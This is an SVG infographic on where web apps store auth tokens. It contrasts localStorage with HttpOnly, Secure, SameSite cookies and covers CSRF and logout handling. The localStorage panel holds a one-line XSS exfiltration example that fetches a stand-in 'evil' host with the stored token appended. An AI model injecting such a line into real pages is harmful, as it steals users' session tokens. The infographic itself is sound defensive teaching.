<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 400" width="800" height="400" font-family="system-ui,-apple-system,Segoe UI,Roboto,sans-serif" role="img" aria-label="Tokens in localStorage can be stolen by any XSS; HttpOnly Secure SameSite cookies cannot be read by JavaScript; a common setup keeps the access token in memory and the refresh token in an HttpOnly cookie"><title>Tokens in localStorage can be stolen by any XSS; HttpOnly Secure SameSite cookies cannot be read by JavaScript; a common setup keeps the access token in memory and the refresh token in an HttpOnly cookie</title><defs><marker id="a-slate" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="#64748b"/></marker><marker id="a-indigo" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="#6366f1"/></marker><marker id="a-green" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="#10b981"/></marker><marker id="a-amber" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="#f59e0b"/></marker><marker id="a-red" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="#ef4444"/></marker><marker id="a-sky" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="#0ea5e9"/></marker><marker id="a-violet" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="#8b5cf6"/></marker><marker id="a-pink" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="#ec4899"/></marker><marker id="a-teal" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="#14b8a6"/></marker></defs><rect x="1" y="1" width="798" height="398" rx="14" fill="#eef2f7" stroke="#94a3b8" stroke-width="2"/><text x="400" y="32" font-size="19" text-anchor="middle" fill="#1e293b" font-weight="700">Where to keep auth tokens</text><rect x="30" y="66" width="360" height="150" rx="6" fill="#fee2e2" stroke="#ef4444" stroke-width="1.5"/><text x="44" y="107.7" font-size="12" text-anchor="start" fill="#1e293b" xml:space="preserve" style="white-space:pre">localStorage.setItem('token', jwt)</text><text x="44" y="122.7" font-size="12" text-anchor="start" fill="#1e293b" xml:space="preserve" style="white-space:pre"></text><text x="44" y="137.7" font-size="12" text-anchor="start" fill="#1e293b" xml:space="preserve" style="white-space:pre">• any script on the page can read it</text><text x="44" y="152.7" font-size="12" text-anchor="start" fill="#1e293b" xml:space="preserve" style="white-space:pre">• one XSS → token sent to attacker</text><text x="44" y="167.7" font-size="12" text-anchor="start" fill="#1e293b" xml:space="preserve" style="white-space:pre">  fetch('https://evil?t=' + localStorage…)</text><text x="44" y="182.7" font-size="12" text-anchor="start" fill="#1e293b" xml:space="preserve" style="white-space:pre">• survives tab close until removed</text><rect x="410" y="66" width="360" height="150" rx="6" fill="#d1fae5" stroke="#10b981" stroke-width="1.5"/><text x="424" y="107.7" font-size="12" text-anchor="start" fill="#1e293b" xml:space="preserve" style="white-space:pre">Set-Cookie: session=…;</text><text x="424" y="122.7" font-size="12" text-anchor="start" fill="#1e293b" xml:space="preserve" style="white-space:pre">  HttpOnly; Secure; SameSite=Lax; Path=/</text><text x="424" y="137.7" font-size="12" text-anchor="start" fill="#1e293b" xml:space="preserve" style="white-space:pre"></text><text x="424" y="152.7" font-size="12" text-anchor="start" fill="#1e293b" xml:space="preserve" style="white-space:pre">• JavaScript cannot read it (HttpOnly)</text><text x="424" y="167.7" font-size="12" text-anchor="start" fill="#1e293b" xml:space="preserve" style="white-space:pre">• only over HTTPS (Secure)</text><text x="424" y="182.7" font-size="12" text-anchor="start" fill="#1e293b" xml:space="preserve" style="white-space:pre">• not sent on cross-site POSTs (SameSite)</text><rect x="30" y="236" width="740" height="70" rx="6" fill="#fef3c7" stroke="#f59e0b" stroke-width="1.5"/><text x="400" y="267.7" font-size="12" text-anchor="middle" fill="#1e293b">Common SPA setup: short-lived access token in memory + refresh token in an HttpOnly cookie (path=/api/auth).</text><text x="400" y="282.7" font-size="12" text-anchor="middle" fill="#1e293b">On logout: clear the cookie on the server, revoke the refresh token, drop in-memory state.</text><rect x="30" y="320" width="740" height="50" rx="6" fill="#e2e8f0" stroke="#64748b" stroke-width="1.5"/><text x="400" y="349.2" font-size="12" text-anchor="middle" fill="#1e293b">Cookies bring CSRF risk (sent automatically) → SameSite + CSRF tokens. HttpOnly limits XSS damage but does not stop XSS.</text></svg>